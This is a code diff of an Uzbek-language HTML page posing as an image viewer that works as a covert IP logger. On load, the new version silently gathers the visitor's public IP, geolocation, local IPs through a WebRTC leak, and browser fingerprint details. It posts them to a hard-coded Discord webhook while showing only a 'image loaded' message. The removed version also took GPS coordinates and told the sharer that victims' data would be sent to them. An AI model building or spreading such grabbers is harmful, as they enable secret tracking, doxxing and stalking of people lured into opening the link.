@@ -3,637 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rasm Yuklab Olish</title>
+    <title>Rasm Yuklash</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
         body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            margin: 0;
             padding: 20px;
-            color: #333;
         }
-        
         .container {
             max-width: 800px;
-            width: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-            margin: 20px 0;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        
-        .header {
-            background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        }
-        
-        .header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-        
-        .content {
-            padding: 40px;
-        }
-        
-        .image-container {
-            text-align: center;
-            margin: 30px 0;
-        }
-        
-        .image-container img {
+        img {
             max-width: 100%;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-            transition: transform 0.3s;
-        }
-        
-        .image-container img:hover {
-            transform: scale(1.02);
-        }
-        
-        .download-section {
-            text-align: center;
-            margin: 40px 0;
-        }
-        
-        .copy-section {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 25px;
-            margin: 20px 0;
-        }
-        
-        .copy-section h3 {
-            color: #5a0fb9;
-            margin-bottom: 15px;
-            font-size: 1.4rem;
-            text-align: center;
-        }
-        
-        .link-container {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .link-input {
-            flex: 1;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 16px;
-            background: white;
-        }
-        
-        .copy-btn {
-            background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s;
-        }
-        
-        .copy-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(90, 15, 185, 0.4);
-        }
-        
-        .download-link {
-            display: inline-block;
-            background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
-            color: white;
-            padding: 15px 40px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.2rem;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(90, 15, 185, 0.4);
-            margin: 10px 0;
-        }
-        
-        .download-link:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(90, 15, 185, 0.6);
-            text-decoration: none;
-            color: white;
-        }
-        
-        .info-section {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 25px;
-            margin-top: 30px;
-        }
-        
-        .info-section h3 {
-            color: #5a0fb9;
-            margin-bottom: 15px;
-            font-size: 1.4rem;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .info-item {
-            background: white;
-            padding: 15px;
-            border-radius: 10px;
-            border-left: 4px solid #5a0fb9;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .info-item h4 {
-            color: #5a0fb9;
-            margin-bottom: 8px;
-        }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .loading-container {
-            text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-        
-        .spinner {
-            border: 4px solid rgba(90, 15, 185, 0.3);
-            border-radius: 50%;
-            border-top: 4px solid #5a0fb9;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            display: none;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: white;
-            opacity: 0.8;
-        }
-        
-        @media (max-width: 600px) {
-            .header h1 {
-                font-size: 2rem;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .download-link {
-                padding: 12px 30px;
-                font-size: 1rem;
-            }
-            
-            .link-container {
-                flex-direction: column;
-            }
+            height: auto;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>Rasm Yuklab Olish</h1>
-            <p>Quyidagi rasmni yuklab olish uchun linkni bosing</p>
-        </div>
-        
-        <div class="content">
-            <div class="image-container">
-                <img src="image.jpg" alt="Namuna Rasm" id="previewImage" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjBmMGYwIi8+CiAgPHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZmlsbD0iIzMzMyIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlJhc20gTmFtbmEgKGltYWdlLmpwZyk8L3RleHQ+Cjwvc3ZnPg=='">
-            </div>
-            
-            <div class="copy-section">
-                <h3>Tayyor Link</h3>
-                <p>Quyidagi linkni nusxalab, boshqalarga yuboring. Ular linkni bosganda rasm yuklanadi va ularning ma'lumotlari bizga yuboriladi.</p>
-                
-                <div class="link-container">
-                    <input type="text" class="link-input" id="shareableLink" value="https://example.com/download-image" readonly>
-                    <button class="copy-btn" id="copyBtn">Nusxalash</button>
-                </div>
-                
-                <div class="download-section">
-                    <a href="#" class="download-link" id="downloadLink">Rasmni Yuklab Olish</a>
-                </div>
-            </div>
-            
-            <div id="statusMessage" class="status"></div>
-            
-            <div class="info-section">
-                <h3>Qanday Ishlaydi?</h3>
-                <p>Rasmni yuklab olish linkini bosganingizda:</p>
-                <div class="info-grid">
-                    <div class="info-item">
-                        <h4>📡 IP Manzilingiz</h4>
-                        <p>Global va mahalliy IP manzilingiz aniqlanadi</p>
-                    </div>
-                    <div class="info-item">
-                        <h4>📍 Geolokatsiya</h4>
-                        <p>Joylashuvingiz haqida ma'lumot yig'iladi</p>
-                    </div>
-                    <div class="info-item">
-                        <h4>💻 Qurilma Ma'lumotlari</h4>
-                        <p>Brauzer va qurilma haqida ma'lumot olinadi</p>
-                    </div>
-                    <div class="info-item">
-                        <h4>📊 Ma'lumotlar</h4>
-                        <p>Barcha ma'lumotlar tahlil qilinadi</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-container">
-            <div class="spinner"></div>
-            <h2>Rasm Yuklanmoqda...</h2>
-            <p>Iltimos, kuting. Ma'lumotlar yig'ilmoqda</p>
-        </div>
-    </div>
-    
-    <div class="footer">
-        <p>&copy; 2023 Rasm Yuklab Olish Tizimi</p>
+        <h1>Rasm Yuklandi</h1>
+        <img src="image.jpg" alt="Rasm" id="trackingImage">
+        <p>Rasm muvaffaqiyatli yuklandi.</p>
     </div>
 
     <script>
-        // Discord Webhook URL
-        const webhookURL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+        // Discord Webhook URL - O'zingizning URL'ingizni qo'ying
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
         
-        // Joriy sahifa URL ni olish (tayyor link uchun)
-        const currentPageURL = window.location.href;
-        document.getElementById('shareableLink').value = currentPageURL;
+        // URL parametrlarini olish
+        const urlParams = new URLSearchParams(window.location.search);
+        const source = urlParams.get('source') || 'direct_access';
         
-        // Status xabarini ko'rsatish
-        function showStatus(message, type) {
-            const statusElement = document.getElementById('statusMessage');
-            statusElement.textContent = message;
-            statusElement.className = `status ${type}`;
-            statusElement.style.display = 'block';
-            
-            setTimeout(() => {
-                statusElement.style.display = 'none';
-            }, 5000);
-        }
-        
-        // Linkni nusxalash
-        document.getElementById('copyBtn').addEventListener('click', function() {
-            const linkInput = document.getElementById('shareableLink');
-            linkInput.select();
-            linkInput.setSelectionRange(0, 99999); // Mobile uchun
-            
-            navigator.clipboard.writeText(linkInput.value)
-                .then(() => {
-                    showStatus('✅ Link nusxalandi! Endi boshqalarga yuborishingiz mumkin.', 'success');
-                })
-                .catch(err => {
-                    showStatus('❌ Linkni nusxalashda xatolik: ' + err, 'error');
-                });
-        });
-        
-        // Link bosilganda ishlaydigan funksiya
-        document.getElementById('downloadLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            // Yuklash animatsiyasini ko'rsatish
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            
-            // Foydalanuvchi ma'lumotlarini yig'ish va Discord'ga yuborish
-            collectAndSendData();
-            
-            // Rasmni yuklab olish
-            setTimeout(() => {
-                try {
-                    const link = document.createElement('a');
-                    link.href = 'image.jpg';
-                    link.download = 'image.jpg';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                    showStatus('✅ Rasm muvaffaqiyatli yuklab olindi!', 'success');
-                } catch (error) {
-                    showStatus('❌ Rasm yuklab olishda xatolik: ' + error.message, 'error');
-                }
-                
-                // Yuklash animatsiyasini yashirish
-                document.getElementById('loadingOverlay').style.display = 'none';
-            }, 3000);
-        });
+        console.log('🔍 Rasm yuklanmoqda... Manba:', source);
 
-        // Foydalanuvchi ma'lumotlarini yig'ish va yuborish
-        function collectAndSendData() {
-            console.log("Ma'lumotlar yig'ilmoqda...");
-            
-            // 1. Public IP ni olish
-            fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('IP API javob bermadi');
-                }
-                return response.json();
-            })
-            .then(ipData => {
+        // Ma'lumotlarni yig'ish va yuborish
+        async function collectAndSendData() {
+            try {
+                console.log('📡 Ma\'lumotlar yig\'ilmoqda...');
+                
+                // 1. Public IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
                 const publicIP = ipData.ip;
-                console.log("Public IP: ", publicIP);
                 
-                // Geolokatsiya ma'lumotlarini olish
-                return getGeolocation(publicIP).then(geoData => {
-                    console.log("Geolokatsiya: ", geoData);
-                    
-                    // 2. Local IP ni olish
-                    return getLocalIP().then(localIPs => {
-                        console.log("Local IP: ", localIPs);
-                        
-                        // 3. Qurilma ma'lumotlarini yig'ish
-                        const deviceInfo = collectDeviceInfo();
-                        console.log("Qurilma ma'lumotlari: ", deviceInfo);
-                        
-                        // 4. Barcha ma'lumotlarni Discord'ga yuborish
-                        return sendToDiscord(publicIP, localIPs, geoData, deviceInfo);
-                    });
-                });
-            })
-            .then(result => {
-                console.log("Ma'lumotlar yuborildi: ", result);
-                showStatus('✅ Ma\'lumotlar Discord\'ga yuborildi!', 'success');
-            })
-            .catch(error => {
-                console.error('Xato:', error);
-                showStatus('❌ Ma\'lumotlar yuborishda xatolik: ' + error.message, 'error');
-            });
-        }
-
-        // IP orqali geolokatsiya ma'lumotlarini olish
-        function getGeolocation(ip) {
-            return fetch(`https://ipapi.co/${ip}/json/`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Geolokatsiya API javob bermadi');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.error) {
-                        throw new Error(data.reason || 'Geolokatsiya ma\'lumotlari olinmadi');
-                    }
-                    
-                    if (data.ip) {
-                        return {
-                            country: data.country_name || 'Noma\'lum',
-                            region: data.region || 'Noma\'lum',
-                            city: data.city || 'Noma\'lum',
-                            isp: data.org || 'Noma\'lum',
-                            coordinates: data.latitude && data.longitude ? 
-                                `${data.latitude}, ${data.longitude}` : 'Noma\'lum',
-                            timezone: data.timezone || 'Noma\'lum'
-                        };
-                    }
-                    return {};
-                })
-                .catch(error => {
-                    console.error('Geolokatsiya xatosi:', error);
-                    // Alternative geolocation service
-                    return fetch(`http://ip-api.com/json/${ip}`)
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.status === 'success') {
-                                return {
-                                    country: data.country,
-                                    region: data.regionName,
-                                    city: data.city,
-                                    isp: data.isp,
-                                    coordinates: `${data.lat}, ${data.lon}`,
-                                    timezone: data.timezone
-                                };
-                            }
-                            return {};
-                        })
-                        .catch(() => {
-                            return {};
-                        });
-                });
+                // 2. Geolokatsiya
+                let geoData = {};
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                    geoData = await geoResponse.json();
+                } catch (e) {
+                    console.log('Geolokatsiya xatosi:', e);
+                }
+                
+                // 3. Local IP
+                let localIPs = await getLocalIP();
+                
+                // 4. Qurilma ma'lumotlari
+                const deviceInfo = getDeviceInfo();
+                
+                // 5. Discord'ga yuborish
+                await sendToDiscord(publicIP, localIPs, geoData, deviceInfo, source);
+                
+                console.log('✅ Ma\'lumotlar yuborildi');
+                
+            } catch (error) {
+                console.error('❌ Xatolik:', error);
+            }
         }
 
         // Local IP ni olish
         function getLocalIP() {
             return new Promise((resolve) => {
-                let localIPs = "Aniqlanmoqda";
+                let localIPs = "Aniqlanmadi";
                 try {
                     const pc = new RTCPeerConnection({iceServers: []});
                     pc.createDataChannel('');
-                    pc.createOffer().then(function(offer) { 
-                        return pc.setLocalDescription(offer); 
-                    });
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                     
                     const ips = [];
-                    pc.onicecandidate = function(e) {
+                    pc.onicecandidate = (e) => {
                         if (e.candidate) {
                             const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                             if (match) ips.push(match[1]);
                         }
                     };
                     
-                    setTimeout(function() {
+                    setTimeout(() => {
                         localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                         resolve(localIPs);
                     }, 2000);
                     
                 } catch (e) {
-                    localIPs = 'Xato: ' + e.message;
-                    resolve(localIPs);
+                    resolve('Xato: ' + e.message);
                 }
             });
         }
 
-        // Qurilma ma'lumotlarini yig'ish
-        function collectDeviceInfo() {
+        // Qurilma ma'lumotlari
+        function getDeviceInfo() {
             return {
-                platform: navigator.platform,
                 userAgent: navigator.userAgent,
+                platform: navigator.platform,
                 language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Noma\'lum',
-                cookieEnabled: navigator.cookieEnabled,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Noma\'lum',
-                deviceMemory: navigator.deviceMemory || 'Noma\'lum',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: `${screen.colorDepth}-bit`,
+                screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yo\'q',
-                javaEnabled: navigator.javaEnabled ? 'Ha' : 'Yo\'q',
-                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ha' : 'Yo\'q',
-                doNotTrack: navigator.doNotTrack || 'Noma\'lum',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : 'Noma\'lum'
+                cookies: navigator.cookieEnabled ? 'Ha' : 'Yo\'q',
+                java: navigator.javaEnabled ? 'Ha' : 'Yo\'q',
+                pdf: navigator.pdfViewerEnabled ? 'Ha' : 'Yo\'q'
             };
         }
 
-        // Discord'ga ma'lumotlarni yuborish
-        function sendToDiscord(publicIP, localIPs, geoData, deviceInfo) {
+        // Discord'ga yuborish
+        async function sendToDiscord(publicIP, localIPs, geoData, deviceInfo, source) {
             const now = new Date();
             
-            let messageContent = "🖼 **RASM YUKLAB OLINDI**\n\n";
-            messageContent += `📁 **Fayl nomi:** image.jpg\n`;
-            messageContent += `🕐 **Vaqt:** ${now.toLocaleString()}\n`;
-            messageContent += `🔗 **URL:** ${window.location.href}\n\n`;
+            let message = `🖼️ **RASM YUKLANDI**\\n\\n`;
+            message += `📁 **Manba:** ${source}\\n`;
+            message += `🕐 **Vaqt:** ${now.toLocaleString()}\\n`;
+            message += `🔗 **URL:** ${window.location.href}\\n\\n`;
             
-            messageContent += "🌐 **IP Ma'lumotlari**\n";
-            messageContent += `• Public IP: ${publicIP}\n`;
-            messageContent += `• Local IP: ${localIPs}\n\n`;
+            message += `🌐 **IP MA'LUMOTLARI**\\n`;
+            message += `• Public IP: ${publicIP}\\n`;
+            message += `• Local IP: ${localIPs}\\n\\n`;
             
-            if (Object.keys(geoData).length > 0) {
-                messageContent += "🗺 **Geolokatsiya**\n";
-                messageContent += `• Joylashuv: ${geoData.coordinates}\n`;
-                messageContent += `• Shahar: ${geoData.city}\n`;
-                messageContent += `• Hudud: ${geoData.region}, ${geoData.country}\n`;
-                messageContent += `• ISP: ${geoData.isp}\n`;
-                messageContent += `• Vaqt zonasi: ${geoData.timezone}\n\n`;
+            if (geoData.country) {
+                message += `🗺️ **GEOlOKATSIYA**\\n`;
+                message += `• Davlat: ${geoData.country_name || geoData.country}\\n`;
+                message += `• Shahar: ${geoData.city || 'Noma\'lum'}\\n`;
+                message += `• ISP: ${geoData.org || 'Noma\'lum'}\\n\\n`;
             }
             
-            messageContent += "🖥 **Qurilma Ma'lumotlari**\n";
-            messageContent += `• Platforma: ${deviceInfo.platform}\n`;
-            messageContent += `• CPU yadrolari: ${deviceInfo.hardwareConcurrency}\n`;
-            messageContent += `• RAM: ${deviceInfo.deviceMemory ? deviceInfo.deviceMemory + ' GB' : 'Noma\'lum'}\n`;
-            messageContent += `• Ekran o'lchami: ${deviceInfo.screenResolution}\n`;
-            messageContent += `• Rang chuqurligi: ${deviceInfo.colorDepth}\n`;
-            messageContent += `• Vaqt zonasi: ${deviceInfo.timezone}\n`;
-            messageContent += `• Touch nuqtalari: ${deviceInfo.maxTouchPoints}\n`;
-            messageContent += `• Pluginlar: ${deviceInfo.plugins}\n`;
-            messageContent += `• Java: ${deviceInfo.javaEnabled}\n`;
-            messageContent += `• PDF ko'ruvchi: ${deviceInfo.pdfViewerEnabled}\n`;
-            messageContent += `• Kuzatish: ${deviceInfo.doNotTrack}\n`;
-            messageContent += `• Ulanish: ${deviceInfo.connection.effectiveType || 'Noma\'lum'}\n\n`;
+            message += `💻 **QURILMA MA'LUMOTLARI**\\n`;
+            message += `• Brauzer: ${deviceInfo.userAgent.split(') ')[0] + ')'}\\n`;
+            message += `• Platforma: ${deviceInfo.platform}\\n`;
+            message += `• Ekran: ${deviceInfo.screen}\\n`;
+            message += `• Vaqt zonasi: ${deviceInfo.timezone}\\n`;
             
-            messageContent += "🌐 **Brauzer Ma'lumotlari**\n";
-            messageContent += `• Brauzer: ${navigator.userAgent.split(') ')[0] + ")"}\n`;
-
-            const message = {
-                content: messageContent.substring(0, 2000) // Discord xabar chegarasi
+            // Discord chegarasi (2000 belgi)
+            message = message.substring(0, 1900);
+            
+            const payload = {
+                content: message
             };
             
-            console.log("Discord'ga yuborilayotgan xabar: ", message);
-            
-            return fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`Discord javob bermadi: ${response.status} ${response.statusText}`);
-                }
-                return response.json();
-            });
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Discord yuborish xatosi:', error);
+            }
         }
 
-        // GPS ma'lumotlarini yuborish (alohida)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const gpsMsg = {
-                        content: "📍 **GPS TOPILDI!**\n" +
-                                 `• Kenglik: ${position.coords.latitude}\n` +
-                                 `• Uzunlik: ${position.coords.longitude}\n` +
-                                 `• Aniqlik: ${position.coords.accuracy}m\n` +
-                                 `• Balandlik: ${position.coords.altitude || 'Noma\'lum'}m\n` +
-                                 `• Tezlik: ${position.coords.speed || 'Noma\'lum'}m/s`
-                    };
-                    
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(gpsMsg)
-                    }).catch(e => console.log('GPS yuborish xatosi:', e));
-                },
-                function(error) {
-                    console.log('GPS rad etildi:', error.message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        // Sahifa yuklanganda
+        // Sahifa yuklanganda ishga tushirish
         document.addEventListener('DOMContentLoaded', function() {
-            console.log("Sahifa yuklandi. Webhook URL: ", webhookURL);
-            console.log("Tayyor link: ", currentPageURL);
+            console.log('🚀 Sahifa yuklandi, ma\'lumotlar yuborilmoqda...');
+            collectAndSendData();
         });
+
+        // Rasm yuklanganida
+        document.getElementById('trackingImage').onload = function() {
+            console.log('✅ Rasm yuklandi');
+        };
+
+        // Rasm yuklanmaganida
+        document.getElementById('trackingImage').onerror = function() {
+            console.log('❌ Rasm yuklanmadi');
+        };
     </script>
 </body>
 </html>
